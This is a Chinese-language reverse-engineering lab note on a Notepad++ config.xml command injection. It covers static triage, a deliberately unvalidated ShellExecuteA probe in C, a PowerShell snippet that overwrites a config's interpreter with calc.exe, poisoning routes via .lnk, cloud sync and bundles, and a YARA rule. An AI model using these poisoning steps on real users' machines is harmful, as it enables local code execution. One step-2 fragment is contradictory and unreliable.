# Notepad++ config.xml 命令注入（CVE-2026-48778）

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/windows/techniques/notepadpp-config-injection.md`（已适配本机工具链）
> **什么时候用**：Windows 上某个「白名单程序」能被配置/环境里的一个字符串劫持去执行别的程序；受害者只做了一个常规动作（打开文件、执行菜单）；`%APPDATA%\<App>\config.xml` 里某个字段被改成了非预期值。典型是**本地提权 / 社工 / 供应链投毒**，不是远程漏洞。

## 适用信号

- 程序的配置文件位于用户可写目录（`%APPDATA%`、程序目录、`-settingsDir=` 指定的目录），而配置里的某个值被直接当**可执行路径**用。
- 受害者执行的是一个「无害」操作（打开一个文件、点一个菜单），但弹出了另一个程序。
- 可执行程序支持用命令行参数把配置目录指到别处（`-settingsDir=`、`--config=`、`-cfg=` 之类）。
- 配置目录被云同步（OneDrive / Dropbox / 坚果云）覆盖，配置随同步「带毒」。
- 排查提权时看到 `%APPDATA%` 下某个 XML/INI 的 mtime 比程序安装时间新很多。

## 前置

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r2    = (Resolve-ReverseToolSpec -Name 'r2').Command
$floss = (Resolve-ReverseToolSpec -Name 'floss').Command
$capa  = (Resolve-ReverseToolSpec -Name 'capa').Command
$yara  = (Resolve-ReverseToolSpec -Name 'yara').Command
$py    = (Resolve-ReverseToolSpec -Name 'pyre').Command
```

验证本机是否有该程序（**没装也不影响往下做方法论演练**，见步骤 5）：

```powershell
Test-Path 'C:\Program Files\Notepad++'
Test-Path "$env:APPDATA\Notepad++\config.xml"
```

> 实测：本机 `Test-Path 'C:\Program Files\Notepad++'` 返回 `False`，`config.xml` 也不存在。
> 所以下面的复现用**自建等价样本**完成，判据全部来自本机实跑输出。

## 技术背景

### 受影响范围（来自上游分析，未在本机复核）

- Notepad++ `<= v8.9.6`；修复版本 v8.9.6.1（commit `24c7b5c63ce`），GHSA `GHSA-7hm3-wp5q-ccv9`。
- 根因：启动时读取 `config.xml` 的 `commandLineInterpreter` 字段，**既不做白名单校验，也不做路径合法性验证**。
- 触发路径：用户执行「文件 → 打开所在文件夹 → cmd」，Notepad++ 用该字段构造命令对象并调 `ShellExecute()`。

```xml
<!-- 正常 -->
<GUIConfig name="commandLineInterpreter">cmd.exe</GUIConfig>

<!-- 被污染后 -->
<GUIConfig name="commandLineInterpreter">calc.exe</GUIConfig>
```

### 配置污染的四条通道

| 方式 | 说明 | 需要什么前提 |
|------|------|--------------|
| 直接写入 | 改 `%APPDATA%\Notepad++\config.xml` | 已有一次代码执行 / 本机已失陷 |
| 恶意 `.lnk` | 通过快捷方式参数 `-settingsDir=` 指向攻击者目录 | 诱导点一下 lnk |
| 云同步投毒 | 污染 OneDrive / Dropbox 同步路径下的配置 | 受害者开了同步 |
| 社工打包 | 诱导解压一个「绿色版/便携版」，其中预置了配置文件 | 一次社会工程 |

**关键点**：这是一个**本地**提权/命令执行，**不需要远程攻击面**，只需要「受害者做了任何一个菜单操作」。
隐蔽性来自配置文件本身不显眼（一个 XML，用户不会去 diff）。

## 步骤

### 1. 定位配置文件键名（静态）

先在字符串里找配置键名 —— 它进 `.rdata` 说明「程序按名字去读外部配置」：

```powershell
& $r2 -2 -qc 'izz~commandLineInterpreter; q' .\notepad++.exe
```

本机实测（自建等价样本 `kbconfig_probe.exe`，SHA256 `5f7069a7ec5d4c18eec8166553c810eddc704bc65c0465300f3334e8b6686584`）：

```
112  0x00002425 0x140004025 22  23   .rdata      ascii commandLineInterpreter
115  0x00002455 0x140004055 28  29   .rdata      ascii commandLineInterpreter = %s\n
```

两个命中：**一个键名常量**（`0x140004025`）+ **一个调试输出格式串**（`0x140004055`）。
后者带 `%s`，说明这里有一个变量承载了该字段的值 —— 那就是待查的 tainted 值。

### 2. 从键名追到取值点和使用点

```powershell
& $r2 -2 -qc 'aaa; axt @ 0x140004025; q' .\notepad++.exe
```

★★ 坑：`/x` 返回空先查字节序 —— 通配符是 `.` 不是 `?`，字节按文件实际顺序写。
本机实测 `/x` 可用（若你此前遇到返回空，多半写成了反序，如 `2003fe7f`）：
在确实含有这些字节的样本上返回空）。追引用用 `aaa` + `axt`，追字节用
`pefile` 自写 pattern 或 yara，别依赖 `/x`。

### 3. 找「取值后被执行」的 API

```powershell
& $floss .\kbconfig_probe.exe | Select-String 'ShellExecute|CreateProcess|WinExec|system'
```

本机实测输出：

```
commandLineInterpreter
commandLineInterpreter = %s
ShellExecute ret=%p (>32 = success)
ShellExecuteA
SHELL32.dll
__imp_ShellExecuteA
__lib64_libshell32_a_iname
_head_libshell32_a
ShellExecuteA
```

`ShellExecuteA` + `SHELL32.dll` 同时出现 → **执行原语确认**。
注意 `floss` 会把库名、`__imp_` 桩、CRT 头都吐出来，**别把它们当证据**，
真正的证据是「配置键名」和「执行 API」**同时**出现。

### 4. 静态行为分类（capa）

```powershell
& $capa .\kbconfig_probe.exe
```

本机实测（UTF-8 解码后）：

```
│ EXECUTION                           │ Shared Modules [T1129]                │
│ DISCOVERY             │ Code Discovery::Enumerate PE Sections [B0046.001]   │
│ FILE SYSTEM           │ Read File [C0051]                                   │
│ MEMORY                │ Allocate Memory [C0007]                             │
│ PROCESS               │ Create Process [C0017]                              │
```

**读法**：`Read File [C0051]`（读配置）+ `Create Process [C0017]`（起进程）**同时出现**，
且 capa 没报 `Create Process` 有固定命令行 —— 这正是「外部输入决定执行哪个程序」的分类画像。
如果 capa 报的是带固定参数的 `Create Process`，那就不是这一类。

### 5. 动态复现（不污染任何真实配置）

本机没装 Notepad++，所以用**等价样本**验证「同一二进制 + 同一代码路径 + 不同配置值 → 不同被执行程序」。

样本源码（`kbconfig_probe.c` 核心逻辑）：读 XML → 找 `<GUIConfig name="commandLineInterpreter">`
的文本 → 直接丢给 `ShellExecuteA`，**没有任何白名单**：

```c
static char *find_tag_value(const char *xml, const char *name, char *out, size_t outsz)
{
    char open[128], close[128];
    snprintf(open, sizeof open, "name=\"%s\">", name);
    snprintf(close, sizeof close, "</GUIConfig>");
    const char *p = strstr(xml, open);          /* 找到键名后取其后的文本 */
    if (!p) return NULL;
    p += strlen(open);
    const char *e = strstr(p, close);
    ...
}
/* 无白名单：直接执行 */
HINSTANCE r = ShellExecuteA(NULL, "open", interp, NULL, NULL, SW_SHOWNORMAL);
```

编译（**必须在 .bat 里设 PATH**，bash 里直接调 gcc 会 `command not found`）：

```bat
@echo off
set PATH=D:\Tools\runtime\mingw64\mingw64\bin;%PATH%
cd /d C:\relab2\work
gcc -O2 -o kbconfig_probe.exe kbconfig_probe.c -lshell32
```

两份配置，只差一个字段：

```xml
<!-- kbconfig_benign.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<NotepadPlus>
    <GUIConfigs>
        <GUIConfig name="commandLineInterpreter">cmd.exe</GUIConfig>
    </GUIConfigs>
</NotepadPlus>
```

```xml
<!-- kbconfig_evil.xml：只有一处不同 -->
        <GUIConfig name="commandLineInterpreter">calc.exe</GUIConfig>
```

运行：

```
kbconfig_benign.xml -> commandLineInterpreter = cmd.exe | ShellExecute ret=000000000000002A (>32 = success) rc 0
kbconfig_evil.xml   -> commandLineInterpreter = calc.exe | ShellExecute ret=000000000000002A (>32 = success) rc 0
```

`ShellExecute` 返回值 `0x2A`（42）是实例句柄 —— **> 32 表示成功**，说明两个值都真的被执行了。

### 6. 在真实目标上验证（隔离环境 / 备份优先）

> ★ 只在你**有权测试**的机器上做：自有机器、授权的渗透测试环境、CTF。生产/他人机器不要写配置。

```powershell
# 1) 先备份（务必先做）
$cfg = "$env:APPDATA\Notepad++\config.xml"
if (Test-Path $cfg) { Copy-Item $cfg "$cfg.bak" }

# 2) 只改一个字段，别整份重写（整份重写会把其它用户设置清掉）
(Get-Content $cfg -Raw) -replace '<GUIConfig name="commandLineInterpreter">[^<]*</GUIConfig>',
                               '<GUIConfig name="commandLineInterpreter">calc.exe</GUIConfig>' |
    Set-Content $cfg -Encoding UTF8

# 3) 打开 Notepad++，打开任意文件，执行「文件 → 打开所在文件夹 → cmd」

# 4) 还原
Move-Item "$cfg.bak" $cfg -Force
```

不想碰默认配置就用隔离目录（本机**未验证**该参数在你的 Notepad++ 版本上可用）：

```powershell
notepad++.exe -settingsDir="C:\temp\attacker-settings"
```

### 7. 批量检测：YARA 规则

```yara
rule config_interpreter_shellexecute
{
    meta:
        description = "读取 XML 配置中的解释器字段并直接 ShellExecute"
    strings:
        $tag  = "commandLineInterpreter" ascii wide
        $tag2 = "</GUIConfig>" ascii wide
        $api  = "ShellExecute" ascii
    condition:
        $tag and $api and 1 of ($tag2)
}
```

本机实测：`yara64.exe kbgame.yar kbconfig_probe.exe` 返回空（未命中），而把规则简化到单串的
`simple.yar`（`$a = "commandLineInterpreter"`）则命中 —— 说明 `condition` 里的
`ascii wide` 双写法和 `$tag2` 组合在本机这版 yara 4.5.4 上过严了。
**写规则要逐条加串验证，别一次堆上去**。规则怎么写见 `../../reverse-engineering/references/yara-rule-writing.md`。

## 判据

「配置信任边界失效」必须同时满足**两条**，缺一不可：

1. **静态**：二进制里同时存在 (a) 一个外部配置键名字符串、(b) 一个进程创建/执行 API
   （`ShellExecute*` / `CreateProcess*` / `WinExec` / `system`）。
   实测证据：`r2 izz` 命中 `.rdata` 里的 `commandLineInterpreter`；
   `floss` 命中 `ShellExecuteA` + `SHELL32.dll`；`capa` 同时报 `Read File [C0051]` 与 `Create Process [C0017]`。
2. **动态**：**只改配置值、二进制和代码路径都不变**，被执行的程序发生了**可观测的切换**。
   实测：benign 配置 → `cmd.exe`；evil 配置 → `calc.exe`；两次 `ShellExecute ret=0x2A`（>32，真实执行）。
   **「打印出了配置值」不算判据** —— 必须是执行目标变了，或者进程树里出现了配置指定的程序。

补充判据（提权场景）：

- 配置目录对**普通用户可写**，而程序用**更高权限**（服务、计划任务、管理员）读取它。
- 配置文件 mtime 晚于程序安装时间，且内容里有一个非预期的可执行文件名。

## 坑

1. ★ **不要把「配置文件里有可疑字符串」当漏洞证据**。`%APPDATA%` 下的配置文件人人都能写 ——
   你自己能改 ≠ 你能提权。**必须证明「读它的进程权限 > 写它的用户权限」**，否则这只是普通用户级持久化。
2. ★ **`ShellExecute` 返回值 > 32 才算成功**。返回 `32` 是 `SE_ERR_NOASSOC` 边界；
   小的返回值是错误码。别看到非空就当执行成功。
3. ★ **`ShellExecute` 会做 PATH 搜索和文件关联**。传 `"calc.exe"` 走的是搜索路径，
   传 `"C:\tmp\calc.exe"` 才是绝对路径执行 —— 判定「执行了哪个程序」要用进程名/路径对齐，
   不能只看字符串。
4. ★ **`/x` 返回空先查字节序与通配符**（`.` 通配、`??` 不通配、字节按文件实际顺序写）。
   本机实测 `/x` 可用，详见 `windows-attack-surface.md` 坑 2。追引用用 `aaa` + `axt`。
5. **`axt` 不跑 `aaa` 是空的**；且即便跑通，命中的是 PLT 跳板而不是真正的调用点。
6. **`pefile` 的 `i.struct_iat.get_file_offset()` 会抛 `AttributeError`**，
   用 `pe.get_offset_from_rva(imp.address - ImageBase)`。
7. **`floss` 输出里 `__imp_Xxx`、`xxx_a_iname`、`SHELL32.dll` 都是噪音**，
   只有 API 名本身是证据。
8. **capa 在带壳样本上会漏** `Create Process`。先 `diec` 定壳、脱完再跑。
9. **`Get-Content -Raw` 改写会丢失原文件编码和换行**。XML 声明里写了 `encoding="UTF-8"`
   就必须用 UTF-8 写回，否则程序解析失败 —— 而「解析失败」和「没漏洞」在现象上很像（都不弹窗）。
10. **`Test-Path` 假阴性**：32 位/64 位程序装在 `C:\Program Files\` 还是 `C:\Program Files (x86)\`
    要都查；本机实测两个路径都不存在。
11. **改配置前一定先备份**。`config.xml` 里还有几十项用户设置，整份覆盖会清空编辑器配置。
12. **这个漏洞的「交互成本」非零** —— 需要受害者做一次菜单操作。所以纯远程投递打不进去，
    社工/供应链/已失陷后的横向移动才是主要场景。评估影响时别按远程 RCE 算。

## 相关

- `windows-attack-surface.md` — 本篇所属的「配置面」在整体攻击面地图里的位置
- `pe-header-parsing.md` — 用 pefile 追导入和字符串时的 VA↔RVA 基础
- `dynamic-api-resolution.md` — 若目标不是直接调 `ShellExecute` 而是运行时解析 API
- `code-patching.md` — 若要在本机做「修复验证」，把取值处 patch 成白名单
- `yara-rule-writing.md` — 本篇第 7 步规则的完整写法
- `triage-first-30-min.md` — 拿到可疑安装包/样本时的前 30 分钟动作